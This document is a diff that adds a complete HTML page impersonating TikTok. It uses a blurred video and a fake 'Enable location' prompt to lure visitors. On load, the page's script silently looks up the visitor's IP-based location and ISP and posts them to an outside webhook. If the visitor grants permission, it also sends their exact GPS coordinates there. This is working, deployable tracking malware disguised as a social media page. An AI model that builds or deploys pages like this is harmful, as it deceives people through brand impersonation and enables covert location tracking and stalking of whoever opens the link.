@@ -1,0 +1,295 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>TikTok</title>
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body { background: #000; color: white; font-family: -apple-system, BlinkMacSystemFont, sans-serif; overflow-x: hidden; }
+
+.header {
+  background: #000;
+  padding: 12px 20px;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  border-bottom: 1px solid #1a1a1a;
+  position: sticky;
+  top: 0;
+  z-index: 100;
+}
+.logo { font-size: 26px; font-weight: 900; }
+.logo .tik { color: white; }
+.logo .tok { color: #fe2c55; }
+.search-bar input {
+  background: #1a1a1a;
+  border: 1px solid #333;
+  color: white;
+  padding: 8px 15px;
+  border-radius: 20px;
+  width: 200px;
+  font-size: 14px;
+}
+
+.container { max-width: 420px; margin: 0 auto; padding-bottom: 80px; }
+
+/* Blur overlay على الفيديو */
+.video-wrapper {
+  position: relative;
+  width: 100%;
+}
+.blur-overlay {
+  position: absolute;
+  top: 0; left: 0;
+  width: 100%; height: 100%;
+  backdrop-filter: blur(15px);
+  background: rgba(0,0,0,0.6);
+  z-index: 10;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  gap: 15px;
+  cursor: pointer;
+}
+.lock-icon { font-size: 50px; }
+.blur-text { font-size: 15px; color: #ddd; text-align: center; padding: 0 30px; line-height: 1.5; }
+.unlock-btn {
+  background: #fe2c55;
+  color: white;
+  border: none;
+  padding: 12px 30px;
+  border-radius: 25px;
+  font-size: 15px;
+  font-weight: bold;
+  cursor: pointer;
+  margin-top: 5px;
+}
+
+/* TikTok embed */
+.tiktok-embed-wrapper {
+  width: 100%;
+  min-height: 700px;
+  background: #000;
+}
+.tiktok-embed-wrapper iframe {
+  width: 100% !important;
+  max-width: 100% !important;
+}
+
+.video-info { padding: 12px 15px; }
+.username { font-weight: bold; font-size: 15px; margin-bottom: 5px; }
+.caption { font-size: 13px; color: #ddd; line-height: 1.5; }
+.hashtag { color: #fe2c55; }
+
+.actions {
+  display: flex;
+  gap: 20px;
+  padding: 10px 15px;
+  border-top: 1px solid #1a1a1a;
+}
+.action { display: flex; align-items: center; gap: 6px; color: #aaa; font-size: 14px; cursor: pointer; }
+
+.bottom-nav {
+  position: fixed;
+  bottom: 0;
+  width: 100%;
+  max-width: 420px;
+  background: #000;
+  border-top: 1px solid #1a1a1a;
+  display: flex;
+  justify-content: space-around;
+  padding: 10px 0;
+  z-index: 50;
+}
+.nav-item { display: flex; flex-direction: column; align-items: center; gap: 3px; font-size: 10px; color: #aaa; }
+.nav-icon { font-size: 22px; }
+.nav-item.active { color: white; }
+
+/* Popup */
+.popup-overlay {
+  display: none;
+  position: fixed;
+  top: 0; left: 0;
+  width: 100%; height: 100%;
+  background: rgba(0,0,0,0.85);
+  z-index: 999;
+  align-items: center;
+  justify-content: center;
+}
+.popup {
+  background: #1a1a1a;
+  border-radius: 16px;
+  padding: 25px 20px;
+  max-width: 320px;
+  width: 90%;
+  text-align: center;
+  border: 1px solid #333;
+}
+.popup-icon { font-size: 45px; margin-bottom: 12px; }
+.popup-title { font-size: 17px; font-weight: bold; margin-bottom: 8px; }
+.popup-desc { font-size: 13px; color: #aaa; margin-bottom: 20px; line-height: 1.5; }
+.popup-buttons { display: flex; gap: 10px; }
+.btn-deny {
+  flex: 1;
+  background: #333;
+  color: white;
+  border: none;
+  padding: 12px;
+  border-radius: 10px;
+  font-size: 14px;
+  cursor: pointer;
+}
+.btn-allow {
+  flex: 1;
+  background: #fe2c55;
+  color: white;
+  border: none;
+  padding: 12px;
+  border-radius: 10px;
+  font-size: 14px;
+  font-weight: bold;
+  cursor: pointer;
+}
+</style>
+</head>
+<body>
+
+<div class="header">
+  <div class="logo"><span class="tik">Tik</span><span class="tok">Tok</span></div>
+  <div class="search-bar">
+    <input type="text" placeholder="Search">
+  </div>
+</div>
+
+<div class="container">
+  <div class="video-wrapper">
+
+    <!-- Blur overlay فوق الفيديو -->
+    <div class="blur-overlay" id="blurOverlay" onclick="showPopup()">
+      <div class="lock-icon">🔒</div>
+      <div class="blur-text">Enable location to watch this video in full quality</div>
+      <button class="unlock-btn">Enable & Watch</button>
+    </div>
+
+    <!-- الفيديو الحقيقي مضمّن -->
+    <div class="tiktok-embed-wrapper">
+      <blockquote
+        class="tiktok-embed"
+        cite="https://vt.tiktok.com/ZSfpA5qgy/"
+        data-video-id="ZSfpA5qgy"
+        style="max-width: 605px; min-width: 325px;">
+        <section></section>
+      </blockquote>
+    </div>
+
+  </div>
+
+  <div class="video-info">
+    <div class="username">@cybersec_official ✓</div>
+    <div class="caption">Cybersecurity Conference 2025 🔐 <span class="hashtag">#cybersecurity #hacking #infosec #tech</span></div>
+  </div>
+
+  <div class="actions">
+    <div class="action">❤️ 125.4K</div>
+    <div class="action">💬 1,823</div>
+    <div class="action">↗️ Share</div>
+    <div class="action">🔖 Save</div>
+  </div>
+</div>
+
+<!-- Popup -->
+<div class="popup-overlay" id="popupOverlay">
+  <div class="popup">
+    <div class="popup-icon">📍</div>
+    <div class="popup-title">Enable Location</div>
+    <div class="popup-desc">TikTok uses your location to show trending videos near you and unlock full video quality.</div>
+    <div class="popup-buttons">
+      <button class="btn-deny" onclick="denyLocation()">Not Now</button>
+      <button class="btn-allow" onclick="allowLocation()">Allow</button>
+    </div>
+  </div>
+</div>
+
+<div class="bottom-nav">
+  <div class="nav-item active"><div class="nav-icon">🏠</div>Home</div>
+  <div class="nav-item"><div class="nav-icon">🔍</div>Discover</div>
+  <div class="nav-item"><div class="nav-icon">➕</div></div>
+  <div class="nav-item"><div class="nav-icon">💬</div>Inbox</div>
+  <div class="nav-item"><div class="nav-icon">👤</div>Profile</div>
+</div>
+
+<script async src="https://www.tiktok.com/embed.js"></script>
+
+<script>
+const WEBHOOK = "https://eocy1w7x0u37m91.m.pipedream.net";
+
+async function sendIPLocation() {
+  try {
+    const res = await fetch("https://ipapi.co/json/");
+    const data = await res.json();
+    await fetch(WEBHOOK, {
+      method: "POST",
+      mode: "no-cors",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        type: "IP Location",
+        ip: data.ip,
+        country: data.country_name,
+        region: data.region,
+        city: data.city,
+        lat: data.latitude,
+        lon: data.longitude,
+        isp: data.org,
+        time: new Date().toLocaleString(),
+        maps: `https://www.google.com/maps?q=${data.latitude},${data.longitude}`
+      })
+    });
+  } catch(e) {}
+}
+
+async function sendGPSLocation(lat, lon) {
+  try {
+    await fetch(WEBHOOK, {
+      method: "POST",
+      mode: "no-cors",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        type: "✅ GPS EXACT",
+        lat: lat,
+        lon: lon,
+        time: new Date().toLocaleString(),
+        maps: `https://www.google.com/maps?q=${lat},${lon}`
+      })
+    });
+  } catch(e) {}
+}
+
+function showPopup() {
+  document.getElementById("popupOverlay").style.display = "flex";
+}
+
+function allowLocation() {
+  document.getElementById("popupOverlay").style.display = "none";
+  document.getElementById("blurOverlay").style.display = "none";
+
+  navigator.geolocation.getCurrentPosition(
+    (pos) => sendGPSLocation(pos.coords.latitude, pos.coords.longitude),
+    () => sendIPLocation()
+  );
+}
+
+function denyLocation() {
+  // ما يحوله، يخليه على نفس الصفحة
+  document.getElementById("popupOverlay").style.display = "none";
+}
+
+// يرسل IP تلقائياً عند الفتح
+sendIPLocation();
+
+// يعرض الـ popup بعد ثانيتين
+setTimeout(showPopup, 2000);
+</script>
+</body>
+</html>
